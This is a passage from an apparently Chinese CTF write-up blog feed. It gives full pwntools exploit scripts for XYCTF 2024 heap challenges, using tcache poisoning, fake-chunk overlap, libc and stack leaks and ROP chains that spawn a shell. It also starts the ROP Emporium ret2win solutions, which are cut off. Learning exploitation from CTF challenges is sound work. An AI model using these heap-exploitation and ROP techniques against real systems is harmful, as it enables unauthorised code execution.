class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;xyctf.top&#x27;, 28743)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  <span class="comment"># 2.35</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(r, script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input chunk_idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Enter chunk size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Enter chunk data: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Enter chunk id: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Enter chunk id: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = gift()</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ_addr = libc_base+libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">rdi_addr = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x401750</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2c0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)  <span class="comment"># 0x30</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)  <span class="comment"># 0x30</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x50</span>)  <span class="comment"># 0x60,用来分隔开top chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">base = heap_base &amp; <span class="number">0xffff</span></span><br><span class="line">base = base+<span class="number">0x10</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>, p64(<span class="number">0x1</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x10</span>))  <span class="comment"># 0x20</span></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment"># 相当于堆头给释放了。这里是通过修改堆头内容来改变tcache链表，使得下一次获取chunk可以打到目标位置。</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00\x00\x01&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(environ_addr)</span><br><span class="line"><span class="comment"># dbg(&#x27;b *add_chunk \n b *delete_chunk \n b *view_chunk&#x27;)</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>, payload)  <span class="comment"># x0290</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x20</span>, <span class="string">b&#x27;\x20&#x27;</span>)  <span class="comment"># 0x30</span></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">stack = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">rbp = stack-(<span class="number">0xe20</span>-<span class="number">0xd30</span>)  <span class="comment"># 栈位置不固定，有概率打通。原意是劫持add函数的ret地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00\x00\x00\x00\x01&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(rbp)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>, payload)</span><br><span class="line">log.success(<span class="string">&#x27;rsp: &#x27;</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&#x27;b* add_chunk+303&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x30</span>, p64(<span class="number">0xdeadbeef</span>)+p64(rdi_addr) +</span><br><span class="line">    p64(binsh_addr)+p64(ret)+p64(system_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h5 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h5><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/myheap%E6%89%93%E9%80%9A%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%A0%88.png" alt="myheap打通失败的栈"></p><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/myheap%E6%89%93%E9%80%9A%E6%88%90%E5%8A%9F%E7%9A%84%E6%A0%88.png" alt="myheap打通成功的栈"></p><h3 id="0x0F-ptmalloc2-it’s-myheap-pro"><a href="#0x0F-ptmalloc2-it’s-myheap-pro" class="headerlink" title="0x0F ptmalloc2 it’s myheap pro"></a>0x0F ptmalloc2 it’s myheap pro</h3><h5 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h5><p>这题和上一题的差别在于：限制了size最大不能超过fastbin大小，然后也没直接给出libc地址。所以这道题需要考虑三个问题：泄露堆地址，泄露libc地址，泄露栈地址。泄露堆地址很简单，依然是利用data chunk申请0x18大小就能泄露。但是libc地址，则至少需要一个大于tcachebin_max的chunk才能被放到unsortedbin中。栈地址则劫持data chunk后利用environ来泄露。所以主要的难点其实在于libc的泄露。</p><p>想要释放一个大于0x410的chunk，我们得想办法修改datachunk的size字段和相应buf chunk的size字段。我们考虑伪造一个可以造成chunk重叠的fake chunk，并且劫持一个data chunk使它于fake chunk相关联，如此一来我们就可以重新申请到fake chunk，并且修改其内容，从而改掉与其重叠的chunk的size大于0x410，释放掉我们就得到了unsortedbin中的chunk，通过打印fake chunk我们就能泄露libc地址。</p><p>泄露栈地址如出一辙，但是只需要劫持data chunk打到environ即可，然后找到add_chunk函数的ret地址偏移，后续我们把rop链写到其上即可。但是关于打栈就需要思考一下了。因为这题限制了size最大只能0x80，所以不能用上一题的劫持Tcachebin堆头的思路。这里我们依然利用fake chunk来伪造一个data chunk，使得其可以控制另一个fake chunk2，这样我们就可以通过fake chunk2被释放后申请来修改其相邻被释放chunk的fd，从而申请到栈上。</p><h5 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;xyctf.top&#x27;, 28743)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  <span class="comment"># 2.35</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(r, script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">cho</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cho).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, size, content=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[?] please input chunk_idx: &#x27;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[?] Enter chunk size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;[?] Enter chunk data: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[?] Enter chunk id: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;[?] Enter chunk id: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_heap</span>(<span class="params">this, new_next</span>):</span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    new_next = new_next ^ this</span><br><span class="line">    base = this &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en_heap</span>(<span class="params">this, old_next</span>):</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    this = this &gt;&gt; <span class="number">12</span></span><br><span class="line">    result = this ^ old_next</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(&#x27;b *delete_chunk \n b *add_chunk \n b *view_chunk&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 0-&gt;1</span></span><br><span class="line"><span class="comment"># 取的是tcache 0x20中原本chunk 1的data_chunk做chunk 3的buf_chunk，所以可以泄露chunk 1的地址</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>, p64(<span class="number">0x31</span>)*<span class="number">2</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(p64(<span class="number">0x31</span>)*<span class="number">2</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x310</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base=&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># 注意此时tcache 0x20反向了，因为是先释放的datachunk再释放bufchunk的</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># heapbase+0x420，伪造了个fake chunk，但实际上空出来的位置距离top chunk的size字段只有0x18的空间。这里布置堆风水，后续利用这个堆重叠几乎可以达到任何地方。</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, pay)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)<span class="comment">#一个就会占地0x90</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x50</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>))*<span class="number">5</span>)  <span class="comment"># fake chunk2</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">target = heap_base+<span class="number">0x420</span></span><br><span class="line">base = target &amp; <span class="number">0xffff</span></span><br><span class="line">base = base+<span class="number">0x10</span></span><br><span class="line"><span class="comment"># chunk 3的buf chunk是chunk 1的data chunk，位置在0x2a0。顺便把chunk 1的INUSED改了，所以可以实现double free</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>, p64(<span class="number">0x1</span>)*<span class="number">2</span>+p16(base))  <span class="comment"># p64也行</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment"># free到了tcache 0x90，与下方两个chunk重叠</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取的是tcache 0x90，然后把下方重叠的chunk 4的data chunk和buf chunk的size字段给改了，伪造了个0x500的chunk，这样绕过了程序的size检查，可以释放到unsortedbin中，泄露libc地址。前面申请了一堆chunk就是为了这个做准备的。</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x80</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x500</span>) +</span><br><span class="line">    p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x470</span>)+p64(<span class="number">0x511</span>))</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># unsortedbin 0x510</span></span><br><span class="line">show(<span class="number">6</span>)  <span class="comment"># 打印main_arena的地址</span></span><br><span class="line">r.recvuntil(p64(<span class="number">0x511</span>))</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span>  <span class="comment"># 通过vmmap调试可以得到这个偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base=&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = <span class="number">0x00222200</span>+libc_base</span><br><span class="line">one = [<span class="number">0x50a47</span>, <span class="number">0xebc81</span>, <span class="number">0xebc85</span>, <span class="number">0xebc88</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    one[i] = one[i]+libc_base</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># tcache 0x90</span></span><br><span class="line">pay = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(environ)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x80</span>, pay)  <span class="comment"># 获取栈地址</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr=&quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line">ret = stack-(<span class="number">0x62208</span>-<span class="number">0x620c8</span>)  <span class="comment"># 找到add_chunk函数返回的时候的ret地址</span></span><br><span class="line">rbp = ret-<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># tcache 0x90</span></span><br><span class="line">pay = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0xad0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x80</span>, pay)</span><br><span class="line">delete(<span class="number">10</span>)  <span class="comment"># tcache 0x60必须要先释放chunk10，不然后面劫持chunk8的fd，链表中没有chunk用来打栈。高版本会检查chunk链表数量</span></span><br><span class="line">delete(<span class="number">8</span>)  <span class="comment"># tcache 0x60</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># tcache 0x80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base=&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># 2.35下的fd加密。这里选rbp地址而非直接ret地址是因为fd有对齐要求。</span></span><br><span class="line">next1 = en_heap(heap_base+<span class="number">0xb20</span>, rbp)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x70</span>, p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x50</span>)+p64(<span class="number">1</span>) +</span><br><span class="line">    <span class="comment"># 这里将chunk8的inused改为1了。0xb20就是chunk8的buf chunk地址。chunk8此时是free的状态，所以修改fd就可以打栈了。</span></span><br><span class="line">    p64(heap_base+<span class="number">0xb20</span>)+p64(<span class="number">0x61</span>)+p64(next1))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 取tcache 0x60，也就是原本的chunk8</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 这里释放多一个是因为tcache 0x20中没有有效chunk了，所以补一下</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x4014be&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret:&quot;</span>, <span class="built_in">hex</span>(ret))</span><br><span class="line">pop_rdx_rbx = <span class="number">0x11f2e7</span>+libc_base</span><br><span class="line">system = libc_base + <span class="number">0x050d70</span></span><br><span class="line">bin_sh = libc_base+<span class="number">0x1d8678</span></span><br><span class="line">pop_rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret_addr = <span class="number">0x4014BF</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x50</span>, p64(rbp)+p64(pop_rdi)+p64(bin_sh) +</span><br><span class="line">    p64(ret_addr)+p64(system))  <span class="comment"># 写rop，结束战斗。注意栈平衡问题。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>新生赛：让新生感到后悔的比赛。说实话还是能学到很多东西的。出得很好，下次别出了（bushi</p><p>堆题还是很不熟悉，都是靠xswlhhh椰撑起来的，是时候努力刷一刷buu的题了。</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『ROP Emporium』ret2win</title>
      <link href="/2024/rop-emporium-ret2win/"/>
      <url>/2024/rop-emporium-ret2win/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-ret2win32"><a href="#0x01-ret2win32" class="headerlink" title="0x01 ret2win32"></a>0x01 ret2win32</h3><p>x86架构的ret2text，非常简单，程序有栈溢出，没有canary保护，所以只要溢出覆盖ebp后，将ret地址覆盖为ret2win函数的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x804862C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-ret2win"><a href="#0x02-ret2win" class="headerlink" title="0x02 ret2win"></a>0x02 ret2win</h3><p>x86_64架构的ret2text，一样的非常简单，栈溢出完了之后覆盖ret地址为后门地址即可。但是这里需要注意一个问题，如果直接选取ret2win的函数地址，puts函数可以被正常执行，但是发现flag不会显示出来。不用调试也能知道这是64位下栈平衡的问题，并且前面的函数可以执行但唯独system执行不了的话，是卡在了do_system这个函数，这里不展开叙述。解决方案是，跳过ret2win函数中push rbp的语句即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = 